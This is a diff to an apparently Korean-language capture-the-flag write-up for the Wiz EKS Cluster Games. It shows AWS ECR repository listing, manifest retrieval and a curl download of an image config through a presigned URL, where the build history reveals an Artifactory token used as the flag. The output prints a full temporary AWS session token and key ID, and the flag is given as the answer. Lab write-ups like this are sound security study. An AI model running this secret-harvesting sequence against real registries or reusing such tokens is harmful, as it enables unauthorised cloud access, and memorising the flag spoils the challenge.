@@ -597,10 +597,110 @@ root@wiz-eks-challenge:~/sys# cat config.json
 
 ---
 
+찾은 이 flag가 아니라고 하여 다시 풀었다
+
+다른 ECR 리포지토리 있는지 찾아보기 위해 
+`aws ecr describe-repositories --region us-west-1` 명령어 입력
+
+```
+root@wiz-eks-challenge:~# aws ecr describe-repositories --region us-west-1
+{
+    "repositories": [
+        {
+            "repositoryArn": "arn:aws:ecr:us-west-1:688655246681:repository/central_repo-aaf4a7c",
+            "registryId": "688655246681",
+            "repositoryName": "central_repo-aaf4a7c",
+            "repositoryUri": "688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c",
+            "createdAt": "2023-11-01T13:31:26.721000+00:00",
+            "imageTagMutability": "MUTABLE",
+            "imageScanningConfiguration": {
+                "scanOnPush": false
+            },
+            "encryptionConfiguration": {
+                "encryptionType": "AES256"
+            }
+        },
+        {
+            "repositoryArn": "arn:aws:ecr:us-west-1:688655246681:repository/central_repo-579b0b7",
+            "registryId": "688655246681",
+            "repositoryName": "central_repo-579b0b7",
+            "repositoryUri": "688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-579b0b7",
+            "createdAt": "2025-08-13T10:55:24.121000+00:00",
+            "imageTagMutability": "MUTABLE",
+            "imageScanningConfiguration": {
+                "scanOnPush": false
+            },
+            "encryptionConfiguration": {
+                "encryptionType": "AES256"
+            }
+        }
+    ]
+}
+```
+다른 레포지토리 하나 발견
+
+```
+
+root@wiz-eks-challenge:~# aws ecr list-images \
+>     --repository-name central_repo-aaf4a7c \
+>     --region us-west-1
+{
+    "imageIds": [
+        {
+            "imageDigest": "sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01",
+            "imageTag": "374f28d8-container"
+        }
+    ]
+}
+root@wiz-eks-challenge:~# aws ecr batch-get-image \
+>     --repository-name central_repo-aaf4a7c \
+>     --image-ids imageTag=374f28d8-container \
+>     --region us-west-1
+{
+    "images": [
+        {
+            "registryId": "688655246681",
+            "repositoryName": "central_repo-aaf4a7c",
+            "imageId": {
+                "imageDigest": "sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01",
+                "imageTag": "374f28d8-container"
+            },
+            "imageManifest": "{\n   \"schemaVersion\": 2,\n   \"mediaType\": \"application/vnd.docker.distribution.manifest.v2+json\",\n   \"config\": {\n      \"mediaType\": \"application/vnd.docker.container.image.v1+json\",\n      \"size\": 1236,\n      \"digest\": \"sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3\"\n   },\n   \"layers\": [\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 2219949,\n         \"digest\": \"sha256:3f4d90098f5b5a6f6a76e9d217da85aa39b2081e30fa1f7d287138d6e7bf0ad7\"\n      },\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 164,\n         \"digest\": \"sha256:e7310b04c944c3e0bbb9ebc04b885dc7ad937061e0dc77c73449ef133eab4fd9\"\n      }\n   ]\n}",
+            "imageManifestMediaType": "application/vnd.docker.distribution.manifest.v2+json"
+        }
+    ],
+    "failures": []
+}
+root@wiz-eks-challenge:~# aws ecr get-download-url-for-layer \
+>     --repository-name central_repo-aaf4a7c \
+>     --layer-digest "sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3" \
+>     --region us-west-1
+{
+    "downloadUrl": "https://prod-us-west-1-starport-layer-bucket.s3.us-west-1.amazonaws.com/f196c2-688655246681-76c5c58a-773c-c80f-d629-c244a851a007/47b7c33b-d974-40bd-a0d6-5c912028e963?rid=76c5c58a-773c-c80f-d629-c244a851a007&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECwaCXVzLXdlc3QtMSJIMEYCIQD3IKn9hHXSyZD%2BRbgIC35LStuhD7GH4Y%2BChLEywtuAmgIhAOnVoPxac%2BbcKwZLrhyRN2OiI63T71QbCSuyAIHK5O0sKskDCPX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQBBoMNjQxOTAyMzQ2Njk0IgyoMiRWAgprC1agwTEqnQMuWO0HmUqekTd3mSwGSkNh4EPcI2eIr5J89266fqAO2I%2FqvMldlFkD55jKiDSIVsORIDQ%2Fm82SdpCb3OiIGSHU%2BuODBmKUMfhSCylOmw7j25SybfGSsKKyRsWQpXQx1xQGx3ZLjMKT7Bl07dHuAWbnighWJ0ruGEq5BG4TbRSqN0mKtt73Bz%2FhUXj12hNBIV71bo14pru8Nc228a4Ft4cnROEDfGJpzOlSED%2BUYrpjGWzyyWJ2Roq6I4pTq%2FyM98T4rmG55oUaiyowUszjs%2F8yK3dO%2FscIgdrJCfkiS9Y9Qrv2lAZ5C%2BEBcKf8n3CmC0CTRdksFJuPpiaMTziYDVEw79IPrXNPXUGRfRDGSytARLPga2E1rlkOJ%2FqzjyLTRSJht7Ff0%2FCki8I1jxuM05efqaIw%2FanKLssIxHRxDDnLAVEGF767eduFKPi%2BxsJ76aSNngcaW9TxrPrF07t7i5%2BkmWZDPdF715WkQ%2B6sR%2FBsnsARCLP1X72ThT%2BFcqKRR9jjdcwXVLgncMo%2Fzr%2BcNABvGfsw0Ey1oqVSW4uOLjC%2F3MfPBjqgAVNJ88rKKnqM8bCl5KI%2BY93a5TvmkTwRl%2Butiml1LWZUZ2LTufOxNzeewgY341MrlyTsg1Ih7UY9Uojt2i5zXlw6Fjg%2ByPIaw3H9FOvtclpl5twtl7QHzuwaz2BpEHR%2Bxo%2BTLta9pvlLIdj5E6b%2BTa2YMhMONiaJ011khntZqxtRmJR1ICnd3b1sRrVZClPBq2v4Csw73cmO2WmlKyPhmH4%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20260429T121144Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Credential=ASIAZK5C4QHDM66BQZL5%2F20260429%2Fus-west-1%2Fs3%2Faws4_request&X-Amz-Signature=60a9bf5db54ca45699e1c221401457bc83452e2fc7f88912ec884b1dcbbf7ae9",
+    "layerDigest": "sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3"
+}
+root@wiz-eks-challenge:~# curl -L -o config_real.json "https://prod-us-west-1-starport-layer-bucket.s3.us-west-1.amazonaws.com/f196c2-688655246681-76c5c58a-773c-c80f-d629-c244a851a007/47b7c33b-d974-40bd-a0d6-5c912028e963?rid=76c5c58a-773c-c80f-d629-c244a851a007&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECwaCXVzLXdlc3QtMSJIMEYCIQD3IKn9hHXSyZD%2BRbgIC35LStuhD7GH4Y%2BChLEywtuAmgIhAOnVoPxac%2BbcKwZLrhyRN2OiI63T71QbCSuyAIHK5O0sKskDCPX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQBBoMNjQxOTAyMzQ2Njk0IgyoMiRWAgprC1agwTEqnQMuWO0HmUqekTd3mSwGSkNh4EPcI2eIr5J89266fqAO2I%2FqvMldlFkD55jKiDSIVsORIDQ%2Fm82SdpCb3OiIGSHU%2BuODBmKUMfhSCylOmw7j25SybfGSsKKyRsWQpXQx1xQGx3ZLjMKT7Bl07dHuAWbnighWJ0ruGEq5BG4TbRSqN0mKtt73Bz%2FhUXj12hNBIV71bo14pru8Nc228a4Ft4cnROEDfGJpzOlSED%2BUYrpjGWzyyWJ2Roq6I4pTq%2FyM98T4rmG55oUaiyowUszjs%2F8yK3dO%2FscIgdrJCfkiS9Y9Qrv2lAZ5C%2BEBcKf8n3CmC0CTRdksFJuPpiaMTziYDVEw79IPrXNPXUGRfRDGSytARLPga2E1rlkOJ%2FqzjyLTRSJht7Ff0%2FCki8I1jxuM05efqaIw%2FanKLssIxHRxDDnLAVEGF767eduFKPi%2BxsJ76aSNngcaW9TxrPrF07t7i5%2BkmWZDPdF715WkQ%2B6sR%2FBsnsARCLP1X72ThT%2BFcqKRR9jjdcwXVLgncMo%2Fzr%2BcNABvGfsw0Ey1oqVSW4uOLjC%2F3MfPBjqgAVNJ88rKKnqM8bCl5KI%2BY93a5TvmkTwRl%2Butiml1LWZUZ2LTufOxNzeewgY341MrlyTsg1Ih7UY9Uojt2i5zXlw6Fjg%2ByPIaw3H9FOvtclpl5twtl7QHzuwaz2BpEHR%2Bxo%2BTLta9pvlLIdj5E6b%2BTa2YMhMONiaJ011khntZqxtRmJR1ICnd3b1sRrVZClPBq2v4Csw73cmO2WmlKyPhmH4%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20260429T121144Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Credential=ASIAZK5C4QHDM66BQZL5%2F20260429%2Fus-west-1%2Fs3%2Faws4_request&X-Amz-Signature=60a9bf5db54ca45699e1c221401457bc83452e2fc7f88912ec884b1dcbbf7ae9"
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1236  100  1236    0     0   2608      0 --:--:-- --:--:-- --:--:--  2613
+root@wiz-eks-challenge:~# ls
+config.json  config_real.json  layer.tar.gz  proc  sys
+root@wiz-eks-challenge:~# cat config_real.json 
+{"architecture":"amd64","config":{"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["/bin/sleep","3133337"],"ArgsEscaped":true,"OnBuild":null},"created":"2023-11-01T13:32:07.782534085Z","history":[{"created":"2023-07-18T23:19:33.538571854Z","created_by":"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "},{"created":"2023-07-18T23:19:33.655005962Z","created_by":"/bin/sh -c #(nop)  CMD [\"sh\"]","empty_layer":true},{"created":"2023-11-01T13:32:07.782534085Z","created_by":"RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit","comment":"buildkit.dockerfile.v0"},{"created":"2023-11-01T13:32:07.782534085Z","created_by":"CMD [\"/bin/sleep\" \"3133337\"]","comment":"buildkit.dockerfile.v0","empty_layer":true}],"os":"linux","rootfs":{"type":"layers","diff_ids":["sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f","sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5"]}}root@wiz-eks-ch
+root@wiz-eks-challenge:~# 
+```
+위에서 했던것과 같은 과정을 통해 이미지 내 flag 발견
+
+`wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future}`
+
 ## wargame 문제 풀이 1-4 (eksclustergames)
 
-> 풀이중..
+### Pod Break
+> You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has no permissions. Can you navigate your way to access the EKS Node's privileged service-account?<br><br>
+> Please be aware: Due to security considerations aimed at safeguarding the CTF infrastructure, the node has restricted permissions <br><br>
+> Challenge value: 10 pts.
 
+> 풀이중..
 ---
 
 
